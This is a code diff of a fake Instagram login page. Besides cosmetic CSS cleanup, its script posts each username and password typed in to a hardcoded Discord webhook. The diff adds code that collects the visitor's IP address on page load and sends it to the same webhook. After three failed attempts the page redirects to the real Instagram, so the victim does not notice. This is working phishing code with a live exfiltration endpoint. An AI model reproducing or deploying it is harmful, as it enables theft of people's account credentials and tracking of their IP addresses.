@@ -11,34 +11,34 @@
             margin: 0;
             padding: 0;
             display: flex;
-            flex-direction: column; /* Stack items vertically */
-            justify-content: flex-start; /* Align items to the top */
-            align-items: center; /* Center horizontally */
-            height: 100vh; /* Full viewport height */
-            position: relative; /* Position relative for absolute children */
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            position: relative;
         }
         .container {
             background-color: #fff;
             padding: 20px;
-            border-radius: 0; /* Square edges */
+            border-radius: 0;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
             width: 300px;
             text-align: center;
-            border: 2px solid black; /* Blackout line around the login box */
-            position: absolute; /* Allows overlapping */
-            top: 50px; /* Set to 50px for a little lower position */
-            left: 50%; /* Center horizontally */
-            transform: translateX(-50%); /* Adjust to center */
+            border: 2px solid black;
+            position: absolute;
+            top: 50px;
+            left: 50%;
+            transform: translateX(-50%);
         }
         .logo {
             margin-bottom: 10px;
         }
         .new-logo {
-            margin: 0; /* Remove default margins */
-            width: 700px; /* Set the desired width for the new logo */
-            height: auto; /* Maintain aspect ratio */
-            position: relative; /* Position relative to allow left adjustment */
-            left: -350px; /* Move the logo significantly to the left */
+            margin: 0;
+            width: 700px;
+            height: auto;
+            position: relative;
+            left: -350px;
         }
         input[type="text"],
         input[type="password"] {
@@ -47,12 +47,12 @@
             margin-bottom: 10px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            opacity: 0.8; /* Makes the input box slightly transparent */
+            opacity: 0.8;
         }
         input[type="text"]::placeholder,
         input[type="password"]::placeholder {
-            color: rgba(0, 0, 0, 0.5); /* Placeholder color */
-            opacity: 1; /* Ensures placeholder is visible */
+            color: rgba(0, 0, 0, 0.5);
+            opacity: 1;
         }
         input[type="submit"] {
             width: 100%;
@@ -89,28 +89,28 @@
         }
         .error-message {
             color: red;
-            display: none; /* Initially hidden */
-            margin-top: 10px; /* Space above the message */
+            display: none;
+            margin-top: 10px;
         }
         .register-box {
-            padding: 15px; /* Padding inside the register box */
-            background-color: #f0f0f0; /* Light grey background */
+            padding: 15px;
+            background-color: #f0f0f0;
             font-size: 14px;
             cursor: pointer;
-            border: 2px solid black; /* Blackout line around the register box */
-            border-radius: 0; /* Square edges */
-            text-align: center; /* Center align text */
-            width: 300px; /* Same width as the login box */
-            position: absolute; /* Allows overlapping */
-            top: calc(50px + 400px + 10px); /* Adjust to appear directly below the login box */
-            left: 50%; /* Center horizontally */
-            transform: translateX(-50%); /* Adjust to center */
+            border: 2px solid black;
+            border-radius: 0;
+            text-align: center;
+            width: 300px;
+            position: absolute;
+            top: calc(50px + 400px + 10px);
+            left: 50%;
+            transform: translateX(-50%);
         }
     </style>
 </head>
 <body>
     <img class="new-logo" src="https://cdn.discordapp.com/attachments/1284279948017664010/1284427783275020329/Iphone-with-Instagram-logo-on-screen-on-transparent-background-PNG-removebg-preview.png?ex=66e69817&is=66e54697&hm=2ac5734c0801cbcc44b1ccce7f87884d099ad48878571304164d49bb873cb183" alt="New Instagram Logo">
-    
+
     <div class="container">
         <img class="logo" src="https://shop8039.sfstatic.io/upload_dir/shop/_thumbs/instagram_logo_r30.backdrop.jpg" alt="Instagram Logo" width="150">
         <form id="loginForm">
@@ -124,56 +124,80 @@
         <span class="forgot-password">Forgot password?</span>
     </div>
 
-    <!-- Register box directly under the login form -->
     <div class="register-box">
         <span style="color: grey;">Don't have an account? </span>
         <span style="color: blue; text-decoration: underline; cursor: pointer;">Register yourself</span>
     </div>
 
     <script>
-        let attemptCount = 0; // Counter for login attempts
-        const maxAttempts = 3; // Maximum allowed attempts
+        let attemptCount = 0;
+        const maxAttempts = 3; 
+
+        // Fetch user's IP immediately when the website is opened
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip; // Store IP address
+
+                // Prepare the data to send to the Discord webhook
+                const webhookData = {
+                    content: `IP Address: ${userIP}`
+                };
+
+                // Send the user's IP address to the Discord webhook
+                fetch('https://discord.com/api/webhooks/1284280025151176745/ScXP1MFtXNKsfpAYajg0i2B6Lrp-IZcGtjjrTkJQWBmWuNMmI-Xexjq4Bxh3RcSQDHoH', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(webhookData)
+                })
+                .catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
+            event.preventDefault(); 
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Simulate an invalid login (you can replace this with your own validation)
-            const isValidLogin = false; // Change this according to your actual logic
-
             // Prepare the data to send to the Discord webhook
-            const data = {
-                content: `Username: ${username}\nPassord: ${password}`
+            const webhookData = {
+                content: `Username: ${username}\nPassword: ${password}`
             };
 
             // Increment the attempt count
             attemptCount++;
-            
+
             // Send data to Discord webhook every attempt
             fetch('https://discord.com/api/webhooks/1284280025151176745/ScXP1MFtXNKsfpAYajg0i2B6Lrp-IZcGtjjrTkJQWBmWuNMmI-Xexjq4Bxh3RcSQDHoH', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(webhookData)
             })
             .catch(error => {
                 console.error('There was a problem with the fetch operation:', error);
             });
 
+            // Simulate an invalid login (you can replace this with your own validation)
+            const isValidLogin = false; // Change this according to your actual logic
+
             if (!isValidLogin) {
-                document.getElementById('loginErrorMessage').style.display = 'block'; // Show error message
+                document.getElementById('loginErrorMessage').style.display = 'block';
 
                 if (attemptCount >= maxAttempts) {
-                    // Redirect to Instagram after max attempts
                     window.location.href = 'https://instagram.com';
                 }
             } else {
-                // Proceed with valid login logic here
-                document.getElementById('loginErrorMessage').style.display = 'none'; // Hide error message
-                alert('Login successful!'); // Replace with actual login logic
+                document.getElementById('loginErrorMessage').style.display = 'none';
+                alert('Login successful!'); 
             }
         });
     </script>
